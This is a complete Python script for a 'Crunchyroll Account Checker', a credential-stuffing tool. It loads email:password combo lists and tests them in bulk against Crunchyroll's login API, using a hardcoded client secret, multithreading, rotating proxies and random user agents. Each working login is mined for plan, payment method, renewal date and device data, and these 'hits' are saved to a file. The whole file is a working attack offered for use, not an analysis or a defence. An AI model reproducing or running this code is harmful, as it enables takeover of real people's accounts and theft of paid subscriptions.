#!/usr/bin/env python3
"""
Crunchyroll Account Checker
Interactive Menu with Single & Mass Check Support
"""

import requests
import urllib3
import json
import uuid
import random
import time
import argparse
from threading import Thread, Lock
from queue import Queue, Empty as QueueEmpty
import urllib.parse
from datetime import datetime
import sys
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

THREADS = 25
HITS_FILE = "hits.txt"
CHECKPOINT_FILE = "checkpoint.txt"
TIMEOUT = 30

hits_lock = Lock()
checkpoint_lock = Lock()
stats_lock = Lock()

total_checked = 0
hits_count = 0
free_count = 0
failed_count = 0
errors_count = 0

proxies_list = []
proxy_index = 0
proxy_lock = Lock()

USE_PROXY = False

USER_AGENTS = [
    "crunchyroll/3.74.2 Android/10 okhttp/4.12.0",
    "crunchyroll/3.74.1 Android/11 okhttp/4.12.0",
    "crunchyroll/3.73.0 Android/9 okhttp/4.11.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
]

def clear_screen():
    os.system('clear' if os.name != 'nt' else 'cls')

def print_banner():
    banner = """
    ╔═══════════════════════════════════════════════════════════════╗
    ║                                                               ║
    ║       ██████╗██████╗ ██╗   ██╗███╗   ██╗ ██████╗██╗  ██╗      ║
    ║      ██╔════╝██╔══██╗██║   ██║████╗  ██║██╔════╝██║  ██║      ║
    ║      ██║     ██████╔╝██║   ██║██╔██╗ ██║██║     ███████║      ║
    ║      ██║     ██╔══██╗██║   ██║██║╚██╗██║██║     ██╔══██║      ║
    ║      ╚██████╗██║  ██║╚██████╔╝██║ ╚████║╚██████╗██║  ██║      ║
    ║       ╚═════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝      ║
    ║                                                               ║
    ║                  CRUNCHYROLL ACCOUNT CHECKER                  ║
    ║                                                               ║
    ╚═══════════════════════════════════════════════════════════════╝
    """
    print(banner)

def print_menu():
    print("""
    ┌───────────────────────────────────────┐
    │            MAIN MENU                  │
    ├───────────────────────────────────────┤
    │                                       │
    │   [1]  Single Account Check           │
    │   [2]  Mass Check (from file)         │
    │   [3]  Settings                       │
    │   [4]  Exit                           │
    │                                       │
    └───────────────────────────────────────┘
    """)

def print_settings_menu():
    print(f"""
    ┌───────────────────────────────────────┐
    │            SETTINGS                   │
    ├───────────────────────────────────────┤
    │                                       │
    │   [1]  Proxy: {'ON ' if USE_PROXY else 'OFF'}                       │
    │   [2]  Threads: {THREADS:<3}                     │
    │   [3]  Timeout: {TIMEOUT}s                     │
    │   [4]  Load Proxies                   │
    │   [5]  Back to Main Menu              │
    │                                       │
    └───────────────────────────────────────┘
    """)

def get_random_ua():
    return random.choice(USER_AGENTS)

def generate_guid():
    return str(uuid.uuid4())

def url_encode(text):
    return urllib.parse.quote(text, safe='')

def load_proxies(proxy_file="proxy.txt"):
    global proxies_list, USE_PROXY
    try:
        if os.path.exists(proxy_file):
            with open(proxy_file, 'r', encoding='utf-8') as f:
                proxies_list = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            if proxies_list:
                print(f"\n    [+] Loaded {len(proxies_list)} proxies")
                USE_PROXY = True
                return True
            else:
                print(f"\n    [!] Proxy file is empty")
                return False
        else:
            print(f"\n    [!] Proxy file '{proxy_file}' not found")
            return False
    except Exception as e:
        print(f"\n    [!] Failed to load proxies: {e}")
        return False

def get_next_proxy():
    global proxy_index
    if not USE_PROXY or not proxies_list:
        return None
    
    with proxy_lock:
        proxy = proxies_list[proxy_index % len(proxies_list)]
        proxy_index += 1
        return format_proxy(proxy)

def format_proxy(proxy_string):
    if not proxy_string:
        return None
    
    try:
        proxy_string = proxy_string.strip()
        
        if "://" in proxy_string:
            return {"http": proxy_string, "https": proxy_string}
        
        parts = proxy_string.split(':')
        
        if len(parts) == 2:
            ip, port = parts
            proxy_url = f"http://{ip}:{port}"
        elif len(parts) == 4:
            ip, port, user, password = parts
            proxy_url = f"http://{user}:{password}@{ip}:{port}"
        else:
            proxy_url = f"http://{proxy_string}"
        
        return {"http": proxy_url, "https": proxy_url}
    
    except Exception:
        return None

def save_hit(email, password, account_type, captures):
    with hits_lock:
        try:
            with open(HITS_FILE, 'a', encoding='utf-8') as f:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                capture_str = " | ".join([f"{k}: {v}" for k, v in captures.items() if v])
                f.write(f"[{account_type}] {email}:{password} | {capture_str} | [{timestamp}]\n")
        except Exception as e:
            pass

def save_checkpoint(line_number):
    with checkpoint_lock:
        try:
            with open(CHECKPOINT_FILE, 'w', encoding='utf-8') as f:
                f.write(str(line_number))
        except:
            pass

def load_checkpoint():
    try:
        if os.path.exists(CHECKPOINT_FILE):
            with open(CHECKPOINT_FILE, 'r', encoding='utf-8') as f:
                content = f.read().strip()
                if content:
                    return int(content)
    except:
        pass
    return 0

def reset_stats():
    global total_checked, hits_count, free_count, failed_count, errors_count
    total_checked = 0
    hits_count = 0
    free_count = 0
    failed_count = 0
    errors_count = 0

def update_stats(result_type):
    global total_checked, hits_count, free_count, failed_count, errors_count
    
    with stats_lock:
        total_checked += 1
        if result_type == "hit":
            hits_count += 1
        elif result_type == "free":
            free_count += 1
        elif result_type == "failed":
            failed_count += 1
        elif result_type == "error":
            errors_count += 1

def print_stats():
    with stats_lock:
        print(f"\r    [STATS] Checked: {total_checked} | Hits: {hits_count} | Free: {free_count} | Failed: {failed_count} | Errors: {errors_count}   ", end='', flush=True)

COUNTRY_MAP = {
    "US": "United States", "GB": "United Kingdom", "CA": "Canada",
    "AU": "Australia", "IN": "India", "DE": "Germany",
    "FR": "France", "IT": "Italy", "ES": "Spain",
    "BR": "Brazil", "MX": "Mexico", "JP": "Japan",
}

def translate_country(code):
    if not code:
        return "Unknown"
    return COUNTRY_MAP.get(code.upper(), code)

def translate_plan(max_stream):
    plan_map = {
        "6": "ULTIMATE FAN",
        "4": "MEGA FAN",
        "1": "FAN"
    }
    return plan_map.get(str(max_stream), "PREMIUM")

def translate_email_verified(verified):
    return "Yes" if verified else "No"

def make_request(method, url, **kwargs):
    try:
        if USE_PROXY:
            kwargs['proxies'] = get_next_proxy()
        
        kwargs['timeout'] = kwargs.get('timeout', TIMEOUT)
        kwargs['verify'] = False
        
        if method.upper() == 'GET':
            return requests.get(url, **kwargs)
        elif method.upper() == 'POST':
            return requests.post(url, **kwargs)
        else:
            return None
    except:
        return None

def check_account(email, password, silent=False):
    try:
        ua = get_random_ua()
        guid = generate_guid()
        em = url_encode(email)
        ps = url_encode(password)

        url1 = "https://beta-api.crunchyroll.com/auth/v1/token"
        headers1 = {
            "host": "beta-api.crunchyroll.com",
            "x-datadog-sampling-priority": "0",
            "content-type": "application/x-www-form-urlencoded",
            "accept-encoding": "gzip",
            "user-agent": ua
        }
        data1 = f"grant_type=password&username={em}&password={ps}&scope=offline_access&client_id=ajcylfwdtjjtq7qpgks3&client_secret=oKoU8DMZW7SAaQiGzUEdTQG4IimkL8I_&device_type=SamsungTV&device_id={guid}&device_name=SM-G998U"

        response1 = make_request('POST', url1, data=data1, headers=headers1)
        
        if response1 is None:
            if not silent:
                update_stats("error")
            return {"status": "error", "message": "Connection failed"}

        response_text = response1.text
        
        if "invalid_grant" in response_text or "access_token.invalid" in response_text:
            if not silent:
                update_stats("failed")
            return {"status": "failed", "message": "Invalid credentials"}
        
        if '"error":' in response_text and "access_token" not in response_text:
            if not silent:
                update_stats("failed")
            return {"status": "failed", "message": "Invalid credentials"}

        if "You are being rate limited" in response_text or "rate_limited" in response_text.lower():
            if not silent:
                update_stats("error")
            return {"status": "error", "message": "Rate limited"}

        if "access_token" not in response_text:
            if not silent:
                update_stats("failed")
            return {"status": "failed", "message": "Invalid credentials"}

        try:
            json_response = response1.json()
        except:
            if not silent:
                update_stats("error")
            return {"status": "error", "message": "Parse error"}
        
        token = json_response.get("access_token", "")
        account_id = json_response.get("account_id", "")

        if not token:
            if not silent:
                update_stats("failed")
            return {"status": "failed", "message": "No token"}

        headers2 = {
            "User-Agent": ua,
            "Pragma": "no-cache",
            "Accept": "*/*",
            "host": "beta-api.crunchyroll.com",
            "authorization": f"Bearer {token}",
            "x-datadog-sampling-priority": "0",
            "etp-anonymous-id": guid,
            "accept-encoding": "gzip"
        }

        url2 = "https://beta-api.crunchyroll.com/accounts/v1/me"
        response2 = make_request('GET', url2, headers=headers2)
        
        if response2 is None:
            if not silent:
                update_stats("error")
            return {"status": "error", "message": "Connection failed"}

        try:
            json_response2 = response2.json()
        except:
            json_response2 = {}

        external_id = json_response2.get("external_id", "")
        email_verified = json_response2.get("email_verified", False)
        created_at = json_response2.get("created", "")

        if "accounts.get_account_info.forbidden" in response2.text:
            captures = {
                "EmailVerified": translate_email_verified(email_verified),
                "CreatedAt": created_at
            }
            if not silent:
                update_stats("free")
            return {"status": "free", "message": "Free account", "captures": captures}

        url3 = "https://beta-api.crunchyroll.com/accounts/v1/me/multiprofile"
        response3 = make_request('GET', url3, headers=headers2)

        profile_name = ""
        max_profile = ""
        total_profile = 0

        if response3:
            try:
                if '"profile_name":"' in response3.text:
                    profile_name = response3.text.split('"profile_name":"')[1].split('"')[0]
                
                json_response3 = response3.json()
                max_profile = json_response3.get("tier_max_profiles", "")
                
                profiles = json_response3.get("profiles", [])
                total_profile = len(profiles) if isinstance(profiles, list) else 0
            except:
                pass

        if not external_id:
            external_id = account_id

        url4 = f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits"
        response4 = make_request('GET', url4, headers=headers2)
        
        if response4 is None:
            captures = {
                "EmailVerified": translate_email_verified(email_verified),
                "CreatedAt": created_at
            }
            if not silent:
                update_stats("free")
            return {"status": "free", "message": "Free account", "captures": captures}

        response4_text = response4.text
        
        try:
            json_response4 = response4.json()
        except:
            json_response4 = {}
        
        subscription_country = json_response4.get("subscription_country", "")

        if '"total":0' in response4_text or "subscription.not_found" in response4_text or '"items":[]' in response4_text:
            captures = {
                "EmailVerified": translate_email_verified(email_verified),
                "CreatedAt": created_at,
                "TotalProfile": str(total_profile),
                "MaxProfile": str(max_profile)
            }
            if not silent:
                update_stats("free")
            return {"status": "free", "message": "Free account", "captures": captures}

        max_stream = ""
        if '"concurrent_streams.' in response4_text:
            try:
                max_stream = response4_text.split('"concurrent_streams.')[1].split('"')[0]
            except:
                max_stream = ""

        plan = translate_plan(max_stream)

        url5 = f"https://beta-api.crunchyroll.com/subs/v4/accounts/{account_id}/subscriptions"
        response5 = make_request('GET', url5, headers=headers2)
        
        payment_method = ""
        plan_price = ""
        renew_at = ""
        remaining_days = ""
        cycle = ""

        if response5:
            response5_text = response5.text
            try:
                json_response5 = response5.json()
                payment_method = json_response5.get("paymentMethodType", "")
                cycle = json_response5.get("cycleDuration", "")
                
                currency = ""
                amount = ""
                if '"currencyCode":"' in response5_text:
                    currency = response5_text.split('"currencyCode":"')[1].split('"')[0]
                if currency and f'"currencyCode":"{currency}","amount":' in response5_text:
                    amount = response5_text.split(f'"currencyCode":"{currency}","amount":')[1].split(',')[0].split('}')[0]
                
                plan_price = f"{amount} {currency}" if amount and currency else ""
                
                if '"nextRenewalDate":"' in response5_text:
                    renew_at = response5_text.split('"nextRenewalDate":"')[1].split('T')[0]
                
                if renew_at:
                    try:
                        renewal_date = datetime.strptime(renew_at, "%Y-%m-%d")
                        today = datetime.now()
                        days_left = (renewal_date - today).days
                        remaining_days = f"{days_left} Days"
                        
                        if days_left <= 0:
                            captures = {
                                "Plan": plan,
                                "RemainingDays": remaining_days,
                                "Status": "EXPIRED"
                            }
                            save_hit(email, password, "EXPIRED", captures)
                            if not silent:
                                update_stats("hit")
                            return {"status": "expired", "message": "Expired premium", "captures": captures}
                    except:
                        pass
            except:
                pass

        url6 = f"https://beta-api.crunchyroll.com/accounts/v1/{account_id}/devices/active"
        response6 = make_request('GET', url6, headers=headers2)

        connected_devices = 0
        if response6 and '"id"' in response6.text:
            connected_devices = response6.text.count('"id"')

        if plan:
            captures = {
                "EmailVerified": translate_email_verified(email_verified),
                "CreatedAt": created_at,
                "ProfileName": profile_name,
                "MaxProfile": str(max_profile) if max_profile else "",
                "TotalProfile": str(total_profile) if total_profile else "",
                "Country": translate_country(subscription_country),
                "MaxStream": str(max_stream) if max_stream else "",
                "Plan": plan,
                "PaymentMethod": payment_method,
                "PlanPrice": plan_price,
                "Cycle": str(cycle) if cycle else "",
                "RenewAt": renew_at,
                "RemainingDays": remaining_days,
                "ConnectedDevices": str(connected_devices) if connected_devices else ""
            }
            save_hit(email, password, "PREMIUM", captures)
            if not silent:
                update_stats("hit")
            return {"status": "premium", "message": "PREMIUM ACCOUNT!", "captures": captures}

        if not silent:
            update_stats("failed")
        return {"status": "failed", "message": "Unknown status"}

    except Exception as e:
        if not silent:
            update_stats("error")
        return {"status": "error", "message": str(e)}

def worker(queue):
    while True:
        try:
            item = queue.get(timeout=2)
            if item is None:
                queue.task_done()
                break

            line_num, combo = item

            if ':' not in combo:
                queue.task_done()
                continue

            parts = combo.split(':', 1)
            if len(parts) != 2:
                queue.task_done()
                continue
            
            email = parts[0].strip()
            password = parts[1].strip()

            if not email or not password:
                queue.task_done()
                continue

            check_account(email, password)

            if line_num % 10 == 0:
                save_checkpoint(line_num)

            print_stats()
            queue.task_done()

        except QueueEmpty:
            continue
        except Exception:
            try:
                queue.task_done()
            except:
                pass

def single_check():
    clear_screen()
    print_banner()
    print("""
    ┌───────────────────────────────────────┐
    │         SINGLE ACCOUNT CHECK          │
    └───────────────────────────────────────┘
    """)
    
    email = input("    Enter Email: ").strip()
    if not email:
        print("\n    [!] Email cannot be empty!")
        input("\n    Press Enter to continue...")
        return
    
    password = input("    Enter Password: ").strip()
    if not password:
        print("\n    [!] Password cannot be empty!")
        input("\n    Press Enter to continue...")
        return
    
    print("\n    [*] Checking account...")
    print("    " + "-" * 40)
    
    result = check_account(email, password, silent=True)
    
    print()
    if result["status"] == "premium":
        print("    ╔═══════════════════════════════════════╗")
        print("    ║         PREMIUM ACCOUNT FOUND!        ║")
        print("    ╚═══════════════════════════════════════╝")
        print()
        for key, value in result.get("captures", {}).items():
            if value:
                print(f"    {key}: {value}")
        print(f"\n    [+] Saved to {HITS_FILE}")
    elif result["status"] == "free":
        print("    ┌───────────────────────────────────────┐")
        print("    │           FREE ACCOUNT                │")
        print("    └───────────────────────────────────────┘")
        print()
        for key, value in result.get("captures", {}).items():
            if value:
                print(f"    {key}: {value}")
    elif result["status"] == "expired":
        print("    ┌───────────────────────────────────────┐")
        print("    │         EXPIRED PREMIUM               │")
        print("    └───────────────────────────────────────┘")
        print()
        for key, value in result.get("captures", {}).items():
            if value:
                print(f"    {key}: {value}")
    elif result["status"] == "failed":
        print("    ┌───────────────────────────────────────┐")
        print("    │      INVALID CREDENTIALS              │")
        print("    └───────────────────────────────────────┘")
        print(f"\n    Reason: {result['message']}")
    else:
        print("    ┌───────────────────────────────────────┐")
        print("    │             ERROR                     │")
        print("    └───────────────────────────────────────┘")
        print(f"\n    Reason: {result['message']}")
    
    input("\n    Press Enter to continue...")

def mass_check():
    global THREADS
    clear_screen()
    print_banner()
    print("""
    ┌───────────────────────────────────────┐
    │            MASS CHECK                 │
    └───────────────────────────────────────┘
    """)
    
    combo_file = input("    Enter combo file path (or press Enter for 'combo.txt'): ").strip()
    if not combo_file:
        combo_file = "combo.txt"
    
    if not os.path.exists(combo_file):
        print(f"\n    [!] File '{combo_file}' not found!")
        input("\n    Press Enter to continue...")
        return
    
    with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
        combos = []
        for line in f:
            line = line.strip()
            if line and not line.startswith('#') and ':' in line:
                combos.append(line)
    
    if not combos:
        print(f"\n    [!] No valid combos found in '{combo_file}'!")
        print("    [i] Format: email:password (one per line)")
        input("\n    Press Enter to continue...")
        return
    
    print(f"\n    [+] Loaded {len(combos)} combos")
    print(f"    [+] Proxy: {'ON' if USE_PROXY else 'OFF'}")
    print(f"    [+] Threads: {THREADS}")
    
    resume = input("\n    Resume from checkpoint? (y/n): ").strip().lower()
    start_line = 0
    if resume == 'y':
        start_line = load_checkpoint()
        if start_line > 0:
            print(f"    [+] Resuming from line {start_line}")
    else:
        if os.path.exists(CHECKPOINT_FILE):
            os.remove(CHECKPOINT_FILE)
    
    combos_to_check = [(i, combo) for i, combo in enumerate(combos, 1) if i > start_line]
    
    if not combos_to_check:
        print("\n    [!] All combos already checked!")
        input("\n    Press Enter to continue...")
        return
    
    reset_stats()
    
    print(f"\n    [*] Starting check of {len(combos_to_check)} combos...")
    print("    " + "=" * 50)
    print()
    
    queue = Queue()
    
    for item in combos_to_check:
        queue.put(item)
    
    threads = []
    actual_threads = min(THREADS, len(combos_to_check))
    
    for _ in range(actual_threads):
        t = Thread(target=worker, args=(queue,))
        t.daemon = True
        t.start()
        threads.append(t)
    
    try:
        queue.join()
    except KeyboardInterrupt:
        print("\n\n    [!] Stopped by user")
    
    for _ in range(actual_threads):
        queue.put(None)
    
    for t in threads:
        t.join(timeout=2)
    
    print("\n\n    " + "=" * 50)
    print("    [COMPLETED] All accounts checked!")
    print(f"    [STATS] Total: {total_checked} | Hits: {hits_count} | Free: {free_count} | Failed: {failed_count} | Errors: {errors_count}")
    
    if hits_count > 0:
        print(f"    [+] Hits saved to: {HITS_FILE}")
    
    input("\n    Press Enter to continue...")

def settings_menu():
    global USE_PROXY, THREADS, TIMEOUT
    
    while True:
        clear_screen()
        print_banner()
        print_settings_menu()
        
        choice = input("    Select option: ").strip()
        
        if choice == '1':
            USE_PROXY = not USE_PROXY
            print(f"\n    [+] Proxy {'enabled' if USE_PROXY else 'disabled'}")
            if USE_PROXY and not proxies_list:
                print("    [!] No proxies loaded. Use option 4 to load proxies.")
            time.sleep(1)
        elif choice == '2':
            try:
                new_threads = int(input("\n    Enter number of threads (1-100): ").strip())
                if 1 <= new_threads <= 100:
                    THREADS = new_threads
                    print(f"    [+] Threads set to {THREADS}")
                else:
                    print("    [!] Invalid range")
            except:
                print("    [!] Invalid input")
            time.sleep(1)
        elif choice == '3':
            try:
                new_timeout = int(input("\n    Enter timeout in seconds (5-120): ").strip())
                if 5 <= new_timeout <= 120:
                    TIMEOUT = new_timeout
                    print(f"    [+] Timeout set to {TIMEOUT}s")
                else:
                    print("    [!] Invalid range")
            except:
                print("    [!] Invalid input")
            time.sleep(1)
        elif choice == '4':
            proxy_file = input("\n    Enter proxy file path (or press Enter for 'proxy.txt'): ").strip()
            if not proxy_file:
                proxy_file = "proxy.txt"
            load_proxies(proxy_file)
            time.sleep(2)
        elif choice == '5':
            break
        else:
            print("\n    [!] Invalid option")
            time.sleep(1)

def main_menu():
    while True:
        clear_screen()
        print_banner()
        print_menu()
        
        choice = input("    Select option: ").strip()
        
        if choice == '1':
            single_check()
        elif choice == '2':
            mass_check()
        elif choice == '3':
            settings_menu()
        elif choice == '4':
            clear_screen()
            print("\n    Goodbye!\n")
            sys.exit(0)
        else:
            print("\n    [!] Invalid option")
            time.sleep(1)

def auto_mass_check(combo_file):
    global THREADS
    
    print_banner()
    print(f"    [*] Auto Mass Check Mode")
    print(f"    [+] Combo File: {combo_file}")
    print(f"    [+] Proxy: {'ON' if USE_PROXY else 'OFF'}")
    print(f"    [+] Threads: {THREADS}")
    print("    " + "=" * 50)
    
    with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
        combos = []
        for line in f:
            line = line.strip()
            if line and not line.startswith('#') and ':' in line:
                combos.append(line)
    
    if not combos:
        print(f"\n    [!] No valid combos found in '{combo_file}'!")
        print("    [i] Format: email:password (one per line)")
        return
    
    print(f"    [+] Loaded {len(combos)} combos")
    
    start_line = load_checkpoint()
    if start_line > 0:
        print(f"    [+] Resuming from line {start_line}")
    
    combos_to_check = [(i, combo) for i, combo in enumerate(combos, 1) if i > start_line]
    
    if not combos_to_check:
        print("\n    [!] All combos already checked! Delete checkpoint.txt to restart.")
        return
    
    reset_stats()
    
    print(f"\n    [*] Checking {len(combos_to_check)} combos...")
    print("    " + "=" * 50)
    print()
    
    queue = Queue()
    
    for item in combos_to_check:
        queue.put(item)
    
    threads = []
    actual_threads = min(THREADS, len(combos_to_check))
    
    for _ in range(actual_threads):
        t = Thread(target=worker, args=(queue,))
        t.daemon = True
        t.start()
        threads.append(t)
    
    try:
        queue.join()
    except KeyboardInterrupt:
        print("\n\n    [!] Stopped by user")
    
    for _ in range(actual_threads):
        queue.put(None)
    
    for t in threads:
        t.join(timeout=2)
    
    print("\n\n    " + "=" * 50)
    print("    [COMPLETED] All accounts checked!")
    print(f"    [STATS] Total: {total_checked} | Hits: {hits_count} | Free: {free_count} | Failed: {failed_count} | Errors: {errors_count}")
    
    if hits_count > 0:
        print(f"    [+] Hits saved to: {HITS_FILE}")

def main():
    global USE_PROXY, THREADS, TIMEOUT
    
    parser = argparse.ArgumentParser(description='Crunchyroll Account Checker')
    parser.add_argument('--proxy', '-p', action='store_true', help='Enable proxy usage')
    parser.add_argument('--no-proxy', '-n', action='store_true', help='Disable proxy usage')
    parser.add_argument('--threads', '-t', type=int, default=25, help='Number of threads')
    parser.add_argument('--timeout', type=int, default=30, help='Request timeout')
    parser.add_argument('--combo', '-c', type=str, help='Run mass check directly with this combo file')
    parser.add_argument('--single', '-s', nargs=2, metavar=('EMAIL', 'PASS'), help='Check single account')
    parser.add_argument('--menu', '-m', action='store_true', help='Show interactive menu')
    
    args = parser.parse_args()
    
    THREADS = args.threads
    TIMEOUT = args.timeout
    
    if args.proxy:
        USE_PROXY = True
        if not load_proxies():
            print("    [!] Proxy mode enabled but no proxies loaded!")
            print("    [!] Add proxies to proxy.txt or disable proxy mode")
            USE_PROXY = False
    
    if args.single:
        email, password = args.single
        print(f"\n    Checking {email}...")
        result = check_account(email, password, silent=True)
        print(f"    Result: {result['status']} - {result['message']}")
        if result.get('captures'):
            for k, v in result['captures'].items():
                if v:
                    print(f"    {k}: {v}")
        return
    
    if args.combo:
        if not os.path.exists(args.combo):
            print(f"    [!] File '{args.combo}' not found!")
            return
        auto_mass_check(args.combo)
        return
    
    if args.menu:
        main_menu()
        return
    
    combo_file = "combo.txt"
    if os.path.exists(combo_file):
        with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
            has_combos = any(
                line.strip() and not line.startswith('#') and ':' in line 
                for line in f
            )
        
        if has_combos:
            auto_mass_check(combo_file)
            return
    
    main_menu()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n    [!] Stopped by user")
        sys.exit(0)
